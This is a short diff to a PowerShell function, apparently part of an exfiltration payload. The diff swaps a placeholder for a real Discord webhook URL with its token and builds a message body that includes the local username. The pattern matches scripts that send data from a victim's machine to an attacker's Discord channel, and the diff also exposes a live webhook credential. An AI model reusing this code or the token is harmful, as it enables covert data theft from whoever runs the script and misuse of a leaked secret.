@@ -9,7 +9,7 @@ function dischat {
   [string]$con
   ) 
   
-  $hookUrl = 'YOUR DISCORD WEBHOOK'
+  $hookUrl = 'https://discord.com/api/webhooks/1418321424497508454/K5HvlPOXRDx5889u6iQppB8FfmlN3JCbQ6VFT25CYIja62dM6LmC08DPopuOjFmqkHa4'
   
 $Body = @{
   'username' = $env:username
